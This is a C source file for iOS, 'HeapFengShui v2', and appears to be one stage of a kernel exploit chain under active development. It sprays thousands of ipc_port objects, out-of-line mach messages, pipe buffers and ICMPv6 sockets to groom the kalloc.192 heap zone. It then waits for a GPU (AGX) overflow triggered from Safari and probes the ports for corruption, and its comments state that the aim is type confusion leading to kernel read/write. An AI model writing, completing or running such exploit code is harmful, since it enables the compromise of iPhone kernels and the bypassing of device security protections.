/*
 * HeapFengShui v2 — ipc_port Spray + Non-Destructive Corruption Detection
 * Session 157: Fix v1's fatal flaw (verify_pipes never read bytes).
 *
 * NEW: spray 5,000 ipc_port objects (kalloc.192) as corruption canaries.
 * Use mach_port_kobject() to probe each port after AGX overflow — non-destructive.
 * If port returns KERN_INVALID_RIGHT or wrong kobject → ipc_port corrupted.
 * Corrupted ipc_port.ip_kobject → type confusion → kernel R/W primitive.
 *
 * ALSO: shrink OOL size to 192B to match kalloc.192 (ipc_port zone).
 * AGX overflow adjacent to kalloc.192 → ipc_port body overwritten.
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64 -mios-version-min=17.0 -O2
 *        -o HeapFengShui_v2 heap_fengshui_v2.c -isysroot $(xcrun -sdk iphoneos --show-sdk-path)
 *        -framework CoreFoundation
 *
 * Usage: install + launch via ProcessControl. Check NSLog for [FSv2] lines.
 * After launch: trigger AGX overflow from Safari (WebInspector JS), then
 * hit any app button → probe() is called, reports corrupted ports.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach/mach_types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <pthread.h>
#include <signal.h>

/* ------------------------------------------------------------------ */
/* Spray parameters */
/* ------------------------------------------------------------------ */
#define NUM_IPC_PORTS   5000    /* ipc_port objects (kalloc.192 on arm64) */
#define NUM_PIPES        500    /* pipe buffers (kalloc.16384) — fewer now */
#define PIPE_BUF_SIZE   16384
#define NUM_OOL         3000    /* OOL mach messages (192B = kalloc.192) */
#define OOL_MSG_SIZE     192    /* Match ipc_port zone exactly */
#define NUM_SOCKETS      200    /* ICMPv6 socket canaries */
#define MARKER_PIPE     0xFE
#define MARKER_OOL      0xDF

/* ------------------------------------------------------------------ */
/* Global arrays */
/* ------------------------------------------------------------------ */
static mach_port_t g_ports[NUM_IPC_PORTS];
static int         g_port_count = 0;
static int         g_pipes[NUM_PIPES][2];
static int         g_pipe_count = 0;
static mach_port_t g_ool_ports[NUM_OOL];
static int         g_ool_count = 0;
static int         g_socks[NUM_SOCKETS];
static int         g_sock_count = 0;

/* ------------------------------------------------------------------ */
/* Phase 1A: Spray ipc_port objects into kalloc.192 */
/* Each mach_port_allocate() creates one ipc_port in the kernel.     */
/* We hold send rights; kernel holds ipc_port in kalloc.192 zone.    */
/* ------------------------------------------------------------------ */
static void spray_ipc_ports(void) {
    mach_port_t task = mach_task_self();

    for (int i = 0; i < NUM_IPC_PORTS; i++) {
        mach_port_t port = MACH_PORT_NULL;
        kern_return_t kr = mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &port);
        if (kr != KERN_SUCCESS) {
            fprintf(stderr, "[FSv2] ipc_port alloc failed at %d: %d\n", i, kr);
            break;
        }
        /* Insert send right so we can use it for probing */
        kr = mach_port_insert_right(task, port, port, MACH_MSG_TYPE_MAKE_SEND);
        if (kr != KERN_SUCCESS) {
            mach_port_deallocate(task, port);
            break;
        }
        g_ports[g_port_count++] = port;
    }
    fprintf(stderr, "[FSv2] ipc_ports sprayed: %d (kalloc.192)\n", g_port_count);
}

/* ------------------------------------------------------------------ */
/* Phase 1B: Spray OOL mach messages at 192B (same zone as ipc_port) */
/* ------------------------------------------------------------------ */
static void spray_ool_messages(void) {
    mach_port_t task = mach_task_self();
    char ool_data[OOL_MSG_SIZE];
    memset(ool_data, MARKER_OOL, sizeof(ool_data));

    for (int i = 0; i < NUM_OOL; i++) {
        mach_port_t port = MACH_PORT_NULL;
        if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &port) != KERN_SUCCESS) break;
        if (mach_port_insert_right(task, port, port, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(task, port);
            break;
        }
        *(uint64_t *)ool_data = 0xDFDF000000000000ULL | (uint64_t)i;

        struct {
            mach_msg_header_t    hdr;
            mach_msg_body_t      body;
            mach_msg_ool_descriptor_t ool;
        } msg;

        memset(&msg, 0, sizeof(msg));
        msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(
            MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
        msg.hdr.msgh_size         = sizeof(msg);
        msg.hdr.msgh_remote_port  = port;
        msg.hdr.msgh_local_port   = MACH_PORT_NULL;
        msg.body.msgh_descriptor_count = 1;
        msg.ool.address   = ool_data;
        msg.ool.size      = OOL_MSG_SIZE;
        msg.ool.deallocate = 0;
        msg.ool.copy      = MACH_MSG_VIRTUAL_COPY;
        msg.ool.type      = MACH_MSG_OOL_DESCRIPTOR;

        if (mach_msg(&msg.hdr, MACH_SEND_MSG, sizeof(msg), 0,
                     MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE,
                     MACH_PORT_NULL) == KERN_SUCCESS) {
            g_ool_ports[g_ool_count++] = port;
        } else {
            mach_port_deallocate(task, port);
        }
    }
    fprintf(stderr, "[FSv2] OOL messages: %d (kalloc.%d)\n", g_ool_count, OOL_MSG_SIZE);
}

/* ------------------------------------------------------------------ */
/* Phase 1C: Spray pipe buffers (kalloc.16384) */
/* Fewer pipes — focus is on ipc_port zone now */
/* ------------------------------------------------------------------ */
static void spray_pipes(void) {
    char buf[PIPE_BUF_SIZE];
    memset(buf, MARKER_PIPE, sizeof(buf));
    for (int i = 0; i < NUM_PIPES; i++) {
        if (pipe(g_pipes[i]) < 0) break;
        *(uint64_t *)buf = 0xFEFE000000000000ULL | (uint64_t)i;
        if (write(g_pipes[i][1], buf, PIPE_BUF_SIZE) > 0) g_pipe_count++;
    }
    fprintf(stderr, "[FSv2] pipes: %d (kalloc.16384)\n", g_pipe_count);
}

/* ------------------------------------------------------------------ */
/* Phase 1D: ICMPv6 socket canaries */
/* ------------------------------------------------------------------ */
static void spray_sockets(void) {
    unsigned char filter[32];
    memset(filter, 0xFF, sizeof(filter));
    for (int i = 0; i < NUM_SOCKETS; i++) {
        int fd = socket(30, 2, 58); /* AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6 */
        if (fd < 0) break;
        setsockopt(fd, 58, 18, filter, 32);
        g_socks[g_sock_count++] = fd;
    }
    fprintf(stderr, "[FSv2] socket canaries: %d (ICMPv6)\n", g_sock_count);
}

/* ------------------------------------------------------------------ */
/* Phase 2: PROBE — Non-destructive ipc_port corruption detection     */
/*                                                                     */
/* mach_port_kobject() returns the kobject type of a kernel port.     */
/* Valid ipc_port → IKOT_NO_KOBJECT (receive right with no kobject).  */
/* Corrupted ip_kobject pointer → wrong type or KERN_INVALID_RIGHT.  */
/*                                                                     */
/* CALL THIS AFTER AGX OVERFLOW FIRES.                               */
/* ------------------------------------------------------------------ */
static int probe_ports(void) {
    int corrupted = 0;
    mach_port_name_t name;
    natural_t kotype;

    for (int i = 0; i < g_port_count; i++) {
        kern_return_t kr = mach_port_kobject(mach_task_self(),
                                              g_ports[i],
                                              &kotype,
                                              &name);
        if (kr == KERN_INVALID_RIGHT) {
            /* Port rights gone → ipc_port freed or corrupted */
            fprintf(stderr, "[FSv2] *** PORT %d (port=0x%x) CORRUPTED: KERN_INVALID_RIGHT ***\n",
                    i, g_ports[i]);
            corrupted++;
        } else if (kr == KERN_SUCCESS && kotype != 0 /* IKOT_NO_KOBJECT */) {
            /* Unexpected kobject type — ip_kobject was overwritten */
            fprintf(stderr, "[FSv2] *** PORT %d (port=0x%x) TYPE CONFUSION: kotype=%u ***\n",
                    i, g_ports[i], kotype);
            corrupted++;
        } else if (kr != KERN_SUCCESS) {
            fprintf(stderr, "[FSv2] PORT %d err=%d (likely corrupted)\n", i, kr);
            corrupted++;
        }
    }

    fprintf(stderr, "[FSv2] PROBE DONE: %d/%d ports corrupted\n", corrupted, g_port_count);
    return corrupted;
}

/* ------------------------------------------------------------------ */
/* Signal handler: SIGUSR1 = trigger probe */
/* Python controller sends: kill(pid, signal.SIGUSR1) after overflow  */
/* ------------------------------------------------------------------ */
static void sigusr1_handler(int sig) {
    (void)sig;
    fprintf(stderr, "[FSv2] SIGUSR1 received — probing ports NOW\n");
    int n = probe_ports();
    if (n > 0) {
        fprintf(stderr, "[FSv2] *** KERNEL R/W CANDIDATE: %d ports corrupted ***\n", n);
    } else {
        fprintf(stderr, "[FSv2] Clean — overflow did not reach kalloc.192 this round\n");
    }
}

/* ------------------------------------------------------------------ */
/* Main */
/* ------------------------------------------------------------------ */
int main(void) {
    fprintf(stderr, "=== HeapFengShui v2 (ipc_port spray) ===\n");
    fprintf(stderr, "Spray: %d ipc_ports + %d OOL@192B + %d pipes + %d sockets\n",
            NUM_IPC_PORTS, NUM_OOL, NUM_PIPES, NUM_SOCKETS);

    /* Phase 1: Spray all object types */
    spray_ipc_ports();
    spray_ool_messages();
    spray_pipes();
    spray_sockets();

    int total = g_port_count + g_ool_count + g_pipe_count + g_sock_count;
    fprintf(stderr, "[FSv2] READY — %d kernel objects held open\n", total);
    fprintf(stderr, "[FSv2] PID=%d — send SIGUSR1 after AGX overflow fires\n", getpid());
    fprintf(stderr, "[FSv2] python: os.kill(%d, signal.SIGUSR1)\n", getpid());

    /* Register signal handler for probe trigger */
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sigusr1_handler;
    sigaction(SIGUSR1, &sa, NULL);

    /* Hold objects open via CFRunLoopRun */
    void *cf = dlopen(
        "/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", 1);
    if (cf) {
        void (*run)(void) = dlsym(cf, "CFRunLoopRun");
        if (run) {
            fprintf(stderr, "[FSv2] CFRunLoopRun — waiting for SIGUSR1...\n");
            run();
        }
    }

    /* Fallback spin */
    while (1) { __asm__ volatile("yield"); }
    return 0;
}
